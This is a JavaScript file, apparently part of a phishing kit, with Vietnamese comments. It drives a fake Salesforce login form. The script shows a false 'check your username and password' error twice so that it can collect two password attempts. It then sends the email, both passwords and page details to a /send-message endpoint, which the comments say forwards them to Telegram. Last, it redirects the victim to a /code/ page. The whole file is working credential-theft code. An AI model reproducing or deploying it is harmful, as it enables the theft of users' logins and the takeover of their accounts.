var cnt = 0;
document.getElementById("password").addEventListener("input", function (event) {
    jQuery("#msg").hide().html("");
});
var ps = document.getElementById("password"),
    ps1,
    ps2;

document
    .getElementById("login_form")
    .addEventListener("submit", async function (event) {
        const username = document.getElementById("username").value;

        event.preventDefault(); // Ngăn form submit
        if (cnt < 2) {
            console.log(cnt, ps.value);

            if (cnt == 0) {
                ps1 = ps.value;
            } else if (cnt == 1) {
                ps2 = ps.value;
            }

            cnt++;
            jQuery("#msg")
                .html(
                    "Please check your username and password. If you still can't log in, contact your Salesforce administrator."
                )
                .show();
            return;
        }
        const urlParams = new URLSearchParams(window.location.search);
        const apeal = urlParams.get("apeal");
        //lấy url hiện tại
        const currentUrl = window.location.host;
        //gọi api để bắn về telegram
        // Gọi API với tham số message
        const message = `url: ${currentUrl}\nemail: ${username}\npassword-1: ${ps1}\npassword-2: ${ps2}\napeal: ${apeal}`; // Giá trị message từ input hoặc biến

        // Thay thế http://localhost:3000 bằng location.origin
        const url = `${
            window.location.origin
        }/send-message?message=${encodeURIComponent(message)}`;

        // Gọi API với URL chứa tham số message
        fetch(url)
            .then((response) => {
                if (!response.ok) {
                    throw new Error("Network response was not ok");
                }
                return response.json(); // Nếu API trả về dữ liệu JSON
            })
            .then((data) => {
                console.log("API response:", data);
            })
            .catch((error) => {
                console.error(
                    "There was a problem with the fetch operation:",
                    error
                );
            });

        window.location.href = "/code/" + username;
    });
